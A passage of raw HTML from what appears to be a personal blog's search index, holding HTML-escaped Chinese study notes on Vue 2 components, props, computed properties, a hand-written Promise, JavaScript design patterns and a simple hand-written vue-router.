&lt;p&gt;父&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;child :title.sync=&amp;quot;title&amp;quot;&amp;gt; &amp;lt;/child&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; &amp;lt;input :value=&amp;quot;title&amp;quot; @input=&amp;quot;abc&amp;quot; type=&amp;quot;text&amp;quot;&amp;gt;
    props: {
      title: {
        type: String,
        required: true
      }
    },
      methods: {
      abc(e) {
        console.log(e.target.value);
        this.$emit(&#39;update:title&#39;, e.target.value);
      }
    }
&lt;/code&gt;&lt;/pre&gt;
"> Vue文档3 Prop</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-wen-dang-2/"" data-c="
          &lt;h2 id=&#34;表单输入绑定&#34;&gt;表单输入绑定&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;v-model&lt;/code&gt; 指令在表单 &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt; 及 &lt;code&gt;&amp;lt;select&amp;gt;&lt;/code&gt; 元素上创建双向数据绑定&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v-model&lt;/code&gt; 会忽略所有表单元素的 &lt;code&gt;value&lt;/code&gt;、&lt;code&gt;checked&lt;/code&gt;、&lt;code&gt;selected&lt;/code&gt; attribute 的初始值而总是将 Vue 实例的数据作为数据来源&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.lazy&lt;/code&gt;    转为在 &lt;code&gt;change&lt;/code&gt; 事件_之后_进行同步&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;input v-model.lazy=&amp;quot;msg&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;.number&lt;/code&gt;  自动将用户的输入值转为数值类型&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.trim&lt;/code&gt;   过滤用户输入的首尾空白字符&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;组件基础&#34;&gt;组件基础&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;// 定义一个名为 button-counter 的新组件
Vue.component(&#39;button-counter&#39;, {
  data: function () {
    return {
      count: 0
    }
  },
  template: &#39;&amp;lt;button v-on:click=&amp;quot;count++&amp;quot;&amp;gt;You clicked me {{ count }} times.&amp;lt;/button&amp;gt;&#39;
})
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;div id=&amp;quot;components-demo&amp;quot;&amp;gt;
  &amp;lt;button-counter&amp;gt;&amp;lt;/button-counter&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;new Vue({ el: &#39;#components-demo&#39; })&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;data-必须是一个函数&#34;&gt;&lt;code&gt;data&lt;/code&gt; 必须是一个函数&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;一个组件的 &lt;code&gt;data&lt;/code&gt; 选项必须是一个函数&lt;/strong&gt;，因此每个实例可以维护一份被返回对象的独立的拷贝：&lt;/p&gt;
&lt;h2 id=&#34;组件的组织&#34;&gt;组件的组织&lt;/h2&gt;
&lt;p&gt;两种组件的注册类型：&lt;strong&gt;全局注册&lt;/strong&gt;和&lt;strong&gt;局部注册&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过 &lt;code&gt;Vue.component&lt;/code&gt; 全局注册&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;prop向子组件传递数据&#34;&gt;prop向子组件传递数据&lt;/h2&gt;
&lt;p&gt;用&lt;code&gt;v-bind&lt;/code&gt;来动态传递prop&lt;/p&gt;
&lt;h2 id=&#34;单个根元素&#34;&gt;单个根元素&lt;/h2&gt;
&lt;p&gt;将模板的内容包裹在一个父元素内(就是最外面的div)&lt;/p&gt;
&lt;h2 id=&#34;监听子组件事件&#34;&gt;监听子组件事件&lt;/h2&gt;
&lt;p&gt;通过 &lt;code&gt;v-on&lt;/code&gt; 监听子组件实例的任意事件&lt;/p&gt;
&lt;p&gt;同时子组件可以通过调用内建的 &lt;strong&gt;&lt;code&gt;$emit&lt;/code&gt;&lt;/strong&gt; 方法并传入事件名称来触发一个事件&lt;/p&gt;
&lt;h3 id=&#34;在组件上使用-v-model&#34;&gt;在组件上使用 &lt;code&gt;v-model&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;input v-model=&amp;quot;searchText&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;等价于&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;input
  v-bind:value=&amp;quot;searchText&amp;quot;
  v-on:input=&amp;quot;searchText = $event.target.value&amp;quot;
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了让它正常工作，这个组件内的 &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; 必须：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将其 **&lt;code&gt;value&lt;/code&gt; **attribute 绑定到一个名叫 &lt;code&gt;value&lt;/code&gt; 的 prop 上&lt;/li&gt;
&lt;li&gt;在其 &lt;code&gt;input&lt;/code&gt; 事件被触发时，将新的值通过自定义的 &lt;code&gt;input&lt;/code&gt; 事件抛出&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;Vue.component(&#39;custom-input&#39;, {
  props: [&#39;value&#39;],
  template: `
    &amp;lt;input
      v-bind:value=&amp;quot;value&amp;quot;
      v-on:input=&amp;quot;$emit(&#39;input&#39;, $event.target.value)&amp;quot;
    &amp;gt;
  `
})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在 &lt;code&gt;v-model&lt;/code&gt; 就应该可以在这个组件上完美地工作起来了：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;custom-input v-model=&amp;quot;searchText&amp;quot;&amp;gt;&amp;lt;/custom-input&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;通过插槽分发内容&#34;&gt;通过插槽分发内容&lt;/h2&gt;
&lt;p&gt;和 HTML 元素一样，我们经常需要向一个组件传递内容，像这样：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;alert-box&amp;gt;
  Something bad happened.
&amp;lt;/alert-box&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;Vue.component(&#39;alert-box&#39;, {
  template: `
    &amp;lt;div class=&amp;quot;demo-alert-box&amp;quot;&amp;gt;
      &amp;lt;strong&amp;gt;Error!&amp;lt;/strong&amp;gt;
      &amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;
    &amp;lt;/div&amp;gt;
  `
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;动态组件&#34;&gt;动态组件&lt;/h2&gt;
&lt;p&gt;上述内容可以通过 Vue 的 &lt;code&gt;&amp;lt;component&amp;gt;&lt;/code&gt; 元素加一个特殊的 &lt;code&gt;is&lt;/code&gt; attribute 来实现：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!-- 组件会在 `currentTabComponent` 改变时改变 --&amp;gt;
&amp;lt;component v-bind:is=&amp;quot;currentTabComponent&amp;quot;&amp;gt;&amp;lt;/component&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;currentTabComponent&lt;/code&gt; 可以包括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;已注册组件的名字，或&lt;/li&gt;
&lt;li&gt;一个组件的选项对象&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;全局注册&#34;&gt;全局注册&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Vue.component(&#39;my-component-name&#39;, {
  // ... 选项 ...
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;局部注册&#34;&gt;局部注册&lt;/h2&gt;
&lt;p&gt;全局注册往往是不够理想的。比如，如果你使用一个像 webpack 这样的构建系统，全局注册所有的组件意味着即便你已经不再使用一个组件了，它仍然会被包含在你最终的构建结果中。这造成了用户下载的 JavaScript 的无谓的增加。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var ComponentA = { /* ... */ }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后在 &lt;code&gt;components&lt;/code&gt; 选项中定义你想要使用的组件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;new Vue({
  el: &#39;#app&#39;,
  components: {
    &#39;component-a&#39;: ComponentA,
  }
})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果通过 Babel 和 webpack 使用 ES2015 模块，那么代码看起来更像：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import ComponentA from &#39;./ComponentA.vue&#39;

export default {
  components: {
    ComponentA
  },
  // ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用了诸如 Babel 和 webpack 的模块系统。在这些情况下我们推荐创建一个 &lt;code&gt;components&lt;/code&gt; 目录，并将每个组件放置在其各自的文件中。&lt;/p&gt;
&lt;h2 id=&#34;基础组件的自动化全局注册&#34;&gt;基础组件的自动化全局注册&lt;/h2&gt;
&lt;p&gt;可以使用 &lt;code&gt;require.context&lt;/code&gt; 只全局注册这些非常通用的基础组件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;全局注册的行为必须在根 Vue 实例 (通过 &lt;code&gt;new Vue&lt;/code&gt;) 创建之前发生&lt;/strong&gt;&lt;/p&gt;
"> Vue文档2 components</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/shou-xie-promise/"" data-c="
          &lt;p&gt;promise是用来解决两个问题的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;回调地狱，代码难以维护， 常常第一个的函数的输出是第二个函数的输入这种现象&lt;/li&gt;
&lt;li&gt;promise可以支持多个并发的请求，获取并发请求中的数据&lt;/li&gt;
&lt;li&gt;这个promise可以解决异步的问题，本身不能说promise是异步的&lt;/li&gt;
&lt;/ul&gt;
 &lt;br&gt;
&lt;h2 id=&#34;实现代码&#34;&gt;&lt;strong&gt;实现代码&lt;/strong&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; class mypromise {

        constructor(exeutor) {
            this.state = PENDING
            //成功的存储
            this.value = undefined
            //失败的存储
            this.reason = undefined

            //存放成功时候的回调函数
            this.ResolveCallbakc = []
            //存放失败时候的回调函数
            this.RejectCallback = []
            //要把这个值保存起来 调用then的时候还需要使用
            let resolve = (value) =&amp;gt; {
                
                if (this.state == PENDING) {
                    //定时器用于then先注册才去改变状态 
                  setTimeout(()=&amp;gt;{
                        //存起来
                    console.log(&#39;成功的构造&#39;);
                    this.value = value
                    //改变状态
                    this.state = FULFILLED
                    //全执行
                    this.ResolveCallbakc.forEach(fn =&amp;gt; fn())  //发布过程
                  })
                }
            }
            let reject = (reason) =&amp;gt; {

                if (this.state == PENDING) {
                setTimeout(()=&amp;gt;{
                    console.log(&#39;失败的构造&#39;);
                    //也存起来
                    this.reason = reason

                    this.state = REJECTED

                    this.RejectCallback.forEach(fn =&amp;gt; fn())
                })
                }
            }
            //传入两个参数 给用户来改变状态
            try {
                exeutor(resolve, reject)
            } catch (e) {
                //当前有异常
                reject(e)
            }
        }
        then(onfulfilled, onrejected) {
            if (this.state == FULFILLED) {
                onfulfilled(this.value)
               
            }
            if (this.state == REJECTED) {
                onrejected(this.reason)
             
            }
            if (this.state == PENDING) {
                console.log(&#39;推入函数&#39;);
                this.ResolveCallbakc.push(() =&amp;gt; {
                    onfulfilled(this.value)
                })
                this.RejectCallback.push(() =&amp;gt; {
                    onrejected(this.reason)
                })
                //链式调用
                return this;

            }

        }

    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;实例&#34;&gt;&lt;strong&gt;实例&lt;/strong&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; let fanfan = new mypromise((resolve, reject) =&amp;gt; {
        console.log(&#39;?&#39;);
        resolve(&#39;fanfan&#39;)
    }).then(res =&amp;gt; {
        setTimeout(()=&amp;gt;{
            console.log(&#39;time&#39;);
        })
        console.log(res);

    }).then(res =&amp;gt; {
        console.log(&#39;?&#39;);
        
    }).then(res=&amp;gt;{
        console.log(res);
    })
 
 // 打印结果 可以看到先是then去注册完才去调用状态改变
 //先微后宏
 /**
 ?
promise2.html:78 推入函数
promise2.html:78 推入函数
promise2.html:78 推入函数
promise2.html:37 成功的构造
promise2.html:100 fanfan
promise2.html:103 ?
promise2.html:106 fanfan
promise2.html:98 time
 */
&lt;/code&gt;&lt;/pre&gt;
">手写Promise</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-she-ji-mo-shi/"" data-c="
          &lt;h1 id=&#34;js的设计模式&#34;&gt;JS的设计模式&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;什么是设计模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设有一个空房间，我们要日复一日地往里 面放一些东西。最简单的办法当然是把这些东西 直接扔进去，但是时间久了，就会发现很难从这 个房子里找到自己想要的东西，要调整某几样东 西的位置也不容易。所以在房间里做一些柜子也 许是个更好的选择，虽然柜子会增加我们的成 本，但它可以在维护阶段为我们带来好处。使用 这些柜子存放东西的规则，或许就是一种模式&lt;/p&gt;
&lt;h2 id=&#34;单例模式&#34;&gt;单例模式&lt;/h2&gt;
&lt;p&gt;确保只有一个实例，并提供全局访问，类似闭包创建后都去访问一个。&lt;/p&gt;
&lt;h2 id=&#34;策略模式&#34;&gt;策略模式&lt;/h2&gt;
&lt;p&gt;定义一系列的算法，把它们一个个封装起来，并且使它们可以相互替换。表单验证用的多&lt;/p&gt;
&lt;h2 id=&#34;代理模式&#34;&gt;代理模式&lt;/h2&gt;
&lt;p&gt;为一个对象提供一个代用品或占位符，以便控制对它的访问，用于对数据进行处理后返回&lt;/p&gt;
&lt;h2 id=&#34;发布-订阅模式&#34;&gt;发布-订阅模式&lt;/h2&gt;
&lt;p&gt;也称作观察者模式（观察者模式子模式），定义了对象间的一种一对多的依赖关系，当一个对象的状态发 生改变时，所有依赖于它的对象都将得到通知 。不直接建立关系，依靠一个中间商来建立&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;   // 观察者
var observer = {
    // 订阅集合
    subscribes: [],

    // 订阅 存放对应key
    subscribe: function(key, fn) {
        //不存在的情况下才默认为一个空数组
        if (!this.subscribes[key]) {
            this.subscribes[key] = [];
        }
      
        
        // 订阅者的处理  是函数就推进去
        typeof fn === &#39;function&#39; &amp;amp;&amp;amp; this.subscribes[key].push(fn);
    },

    // 发布 
    publish: function() {
        
        var type =[].shift.call(arguments) // arguments[0]  去掉第一项 就是 key项 剩余项都是value项
        

            //调用对应key存的函数
            fns = this.subscribes[type];
           
        
        // 不存在的订阅类型，以及订阅时未传入处理回调的
        if (!fns || !fns.length) {
            return;
        }
        
        // 挨个处理调用 就是订阅同一个key很多次 然后一个个调用
        for (var i = 0; i &amp;lt; fns.length; ++i) {
            fns[i].apply(this, arguments);
        }
    },
     
};


//实例


observer.subscribe(&#39;examinationA&#39;, function(score) {
    console.log(score);
});

observer.subscribe(&#39;examinationA&#39;, function(score) {
    console.log(score);
});

observer.publish(&#39;examinationA&#39;, 100); // 100  100  里面两个订阅都打印了出来
&lt;/code&gt;&lt;/pre&gt;
">JS设计模式</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-router/"" data-c="
          &lt;p&gt;&lt;strong&gt;这里的路由就是SPA（单页应用）的路径管理器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;路由用于设定访问路径，并将路径和组件映射起来&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;单页面应用(SPA)的核心之一是: 更新视图而不重新请求页面&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;1-hash模式&#34;&gt;1、Hash模式：&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;vue-router 默认 hash 模式 —— 使用 URL 的 hash 来模拟一个完整的 URL，于是当 URL 改变时，页面不会重新加载。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以通过location.hast取得#后面的路由&lt;/p&gt;
&lt;p&gt;window.onhashchange=functioin(){}    //当hash路由改变时候触发&lt;/p&gt;
&lt;h4 id=&#34;2-history模式&#34;&gt;2、History模式：&lt;/h4&gt;
&lt;p&gt;这种模式充分利用 history.pushState API 来完成 URL 跳转而无须重新加载页面。&lt;/p&gt;
&lt;p&gt;location.pathname 取得路由地址&lt;/p&gt;
&lt;p&gt;onpopstate来监听history的路由变化&lt;/p&gt;
&lt;h4 id=&#34;3-使用路由模块来实现页面跳转的方式&#34;&gt;3、使用路由模块来实现页面跳转的方式&lt;/h4&gt;
&lt;p&gt;方式1：直接修改地址栏&lt;/p&gt;
&lt;p&gt;方式2：this.$router.push(‘路由地址’)&lt;/p&gt;
&lt;p&gt;方式3：&lt;code&gt;&amp;lt;router-link to=&amp;quot;路由地址&amp;quot;&amp;gt;&amp;lt;/router-link&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;4、实现方式&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;Vue.use(VueRouter)&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;执行VueRouter方法&lt;/li&gt;
&lt;li&gt;如果这个方法有一个属性 install 并且这个属性是一个方法 就会执行install这个方法  例如 (VueRouter.install=function(){})&lt;/li&gt;
&lt;li&gt;install这个方法的第一个参数 是vue&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;h4&gt;5、手写router&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//router的index文件

import  VueRouter from &#39;../myrouter/index&#39;
import  Vue from &#39;vue&#39;

const register =() =&amp;gt;import(&#39;../src/register&#39;)
const home =()=&amp;gt;import(&#39;../src/home&#39;)

Vue.use(VueRouter)

const routes=[
    {
        path: &#39;/register&#39;,
        name: &#39;注册&#39;,
        component: register,
        title: &#39;注册&#39;,
      }, {
        path: &#39;/&#39;,
        name: &#39;首页&#39;,
        component: home,
        title: &#39;注册&#39;,
      },
   
   
]

const router = new VueRouter({
    routes
  })

export default router
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//实现VueRouter实例 hash模式实现

let Vue

//注册一个类
class VueRouter{
    constructor(options)
    {
        console.log(options);

        let initPath=&#39;/&#39; //默认值
        Vue.util.defineReactive(this,&#39;current&#39;,initPath) //this指向VueRouter  响应式
        this.current=&#39;/&#39; //当前路由
        this.routes=options.routes//用户路由规则
        this.mode=options.mode||&#39;hash&#39; //默认hash
        this.init() //监听路由改变
        
    }
    init()
    {
     
        if(this.mode==&#39;hash&#39;){
            console.log(location.hash); //拿到hash模式下的hash地址

            //监听第一次加载项目要加/#/
            window.addEventListener(&#39;load&#39;,()=&amp;gt;{
                this.current=location.hash.slice(1)
    
            })
            //监听路由改变
            window.addEventListener(&#39;hashchange&#39;,()=&amp;gt;{
                this.current=location.hash.slice(1)
            })
        }
    }
}

VueRouter.install=function(_Vue){
        Vue=_Vue

        //给调用组件添加一个属性  router
        Vue.mixin({  
            //全局添加数据和方法  vue3改为compostions api
            //每一个实例都是一个 $options api 例如app.vue 和main.js 里面的都是一个实例
            beforeCreate() {
                console.log(this.$options.name);
                if(this.$options.router)//根组件上才有的属性
                {
                    Vue.prototype.$router=this.$options.router //在Vue实例原生链上添加属性 实现全局添加this.$router属性
                }
            },
        })

        //创建全局组件
        //router-link 
        Vue.component(&#39;router-link&#39;,{
            //传参过来
            props:{
              to:{
                  type:String,
                  require:true
              }
            },
            render(h) {
                return h(&#39;a&#39;,{attrs:{
                    href:&amp;quot;#&amp;quot;+this.to
                }},this.$slots.default)//创建html的内容 就是插槽里面的内容
            },
        }),


        Vue.component(&#39;router-view&#39;,{
            //必须是响应式数据才能触发
            render(h) {

                //当前路由
                let current =this.$router.current
                console.log(current);
                //获取到了配置的路由数组  然后通过上面的取出对应的路由模块并且渲染出来
                let routers=this.$router.routes
                console.log(routers);

                //找出匹配的数组项
                let com=routers.find(item=&amp;gt;{
                    return current==item.path
                })
                console.log(com);
                return h(com.component)//创建html
            },
        })
}


export default  VueRouter
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//App.vue 文件

&amp;lt;template&amp;gt;
  &amp;lt;div id=&amp;quot;app&amp;quot;&amp;gt;


&amp;lt;div class=&amp;quot;tolink&amp;quot;&amp;gt;
    &amp;lt;router-link to=&#39;/register&#39;&amp;gt;注册&amp;lt;/router-link&amp;gt;
    &amp;lt;router-link to=&#39;/&#39;&amp;gt;home&amp;lt;/router-link&amp;gt;
   
&amp;lt;/div&amp;gt;
   &amp;lt;div&amp;gt;
      &amp;lt;router-view&amp;gt;&amp;lt;/router-view&amp;gt;
    &amp;lt;/div&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;

export default {
  name: &#39;App&#39;,
  beforeCreate() {
    console.log(this.$router);
  },
  data() {
    return {
  
    }
  },
 


}
&amp;lt;/script&amp;gt;

&amp;lt;style&amp;gt;
.tolink{
  width: 40%;
  margin: auto;
  display: flex;
  justify-content:space-between;
}
&amp;lt;/style&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实现效果&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/image-20210713165156925.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/image-20210713165208681.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">vue-router</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-wen-dang/"" data-c="
          &lt;p&gt;v-html :将模板字符串解析为html格式&lt;/p&gt;
&lt;p&gt;split() 组成字符串数组&lt;/p&gt;
&lt;p&gt;模板表达式都被放在沙盒中，只能访问&lt;a href=&#34;https://github.com/vuejs/vue/blob/v2.6.10/src/core/instance/proxy.js#L9&#34;&gt;全局变量的一个白名单&lt;/a&gt;，如 &lt;code&gt;Math&lt;/code&gt; 和 &lt;code&gt;Date&lt;/code&gt; 。你不应该在模板表达式中试图访问用户定义的全局变量。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;你可以使用动态参数为一个动态的事件名绑定处理函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;a v-on:[eventName]=&amp;quot;doSomething&amp;quot;&amp;gt; ... &amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当 &lt;code&gt;eventName&lt;/code&gt; 的值为 &lt;code&gt;&amp;quot;focus&amp;quot;&lt;/code&gt; 时，&lt;code&gt;v-on:[eventName]&lt;/code&gt; 将等价于 &lt;code&gt;v-on:focus&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;v-bind&#34;&gt;&lt;a href=&#34;https://cn.vuejs.org/v2/guide/syntax.html#v-bind-%E7%BC%A9%E5%86%99&#34;&gt;&lt;code&gt;v-bind&lt;/code&gt; 缩写&lt;/a&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!-- 完整语法 --&amp;gt;
&amp;lt;a v-bind:href=&amp;quot;url&amp;quot;&amp;gt;...&amp;lt;/a&amp;gt;

&amp;lt;!-- 缩写 --&amp;gt;
&amp;lt;a :href=&amp;quot;url&amp;quot;&amp;gt;...&amp;lt;/a&amp;gt;

&amp;lt;!-- 动态参数的缩写 (2.6.0+) --&amp;gt;
&amp;lt;a :[key]=&amp;quot;url&amp;quot;&amp;gt; ... &amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;v-on&#34;&gt;&lt;a href=&#34;https://cn.vuejs.org/v2/guide/syntax.html#v-on-%E7%BC%A9%E5%86%99&#34;&gt;&lt;code&gt;v-on&lt;/code&gt; 缩写&lt;/a&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!-- 完整语法 --&amp;gt;
&amp;lt;a v-on:click=&amp;quot;doSomething&amp;quot;&amp;gt;...&amp;lt;/a&amp;gt;

&amp;lt;!-- 缩写 --&amp;gt;
&amp;lt;a @click=&amp;quot;doSomething&amp;quot;&amp;gt;...&amp;lt;/a&amp;gt;

&amp;lt;!-- 动态参数的缩写 (2.6.0+) --&amp;gt;
&amp;lt;a @[event]=&amp;quot;doSomething&amp;quot;&amp;gt; ... &amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;计算属性和侦听器&#34;&gt;计算属性和侦听器&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;div id=&amp;quot;example&amp;quot;&amp;gt;
  &amp;lt;p&amp;gt;Original message: &amp;quot;{{ message }}&amp;quot;&amp;lt;/p&amp;gt;
  &amp;lt;p&amp;gt;Computed reversed message: &amp;quot;{{ reversedMessage }}&amp;quot;&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-JS&#34;&gt;var vm = new Vue({
  el: &#39;#example&#39;,
  data: {
    message: &#39;Hello&#39;
  },
  computed: {
    // 计算属性的 getter
    reversedMessage: function () {
      // `this` 指向 vm 实例
      return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;)
    }
  }
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;计算属性缓存-vs-方法&#34;&gt;计算属性缓存 vs 方法&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-JS&#34;&gt;&amp;lt;p&amp;gt;Reversed message: &amp;quot;{{ reversedMessage() }}&amp;quot;&amp;lt;/p&amp;gt;

// 在组件中
methods: {
  reversedMessage: function () {
    return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;)
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们可以将同一函数定义为一个方法而不是一个计算属性。两种方式的最终结果确实是完全相同的。然而，不同的是&lt;strong&gt;计算属性是基于它们的响应式依赖进行缓存的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这就意味着只要 &lt;code&gt;message&lt;/code&gt; 还没有发生改变，多次访问 &lt;code&gt;reversedMessage&lt;/code&gt; 计算属性会立即返回之前的计算结果，而不必再次执行函数。&lt;/p&gt;
&lt;p&gt;所以计算属性要是响应试依赖&lt;/p&gt;
&lt;p&gt;这也同样意味着下面的计算属性将不再更新，因为 &lt;code&gt;Date.now()&lt;/code&gt; 不是响应式依赖：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;computed: {
  now: function () {
    return Date.now()
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;计算属性-vs-侦听属性&#34;&gt;计算属性 vs 侦听属性&lt;/h2&gt;
&lt;p&gt;计算属性默认只有 getter，不过在需要时你也可以提供一个 setter：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// ...
computed: {
  fullName: {
    // getter
    get: function () {
      return this.firstName + &#39; &#39; + this.lastName
    },
    // setter
    set: function (newValue) {
      var names = newValue.split(&#39; &#39;)
      this.firstName = names[0]
      this.lastName = names[names.length - 1]
    }
  }
}
// ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;计算属性computed :&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;支持缓存，只有依赖数据发生改变，才会重新进行计算&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不支持异步，当computed内有异步操作时无效，无法监听数据的变化&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​            3.computed 属性值会默认走缓存，计算属性是基于它们的响应式依赖进行               缓存的，也就是基于data中声明过或者父组件传递的props中的数据通过计算得到的值&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;如果一个属性是由其他属性计算而来的，这个属性依赖其他属性，是一个多对一或者一对一，一般用computed&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​           5.如果computed属性属性值是函数，那么默认会走get方法；函数的返回值就是属性的属性值；在computed中的，属性都有一个get和一个set方法，当数据变化时，调用set方法。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;侦听属性watch：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
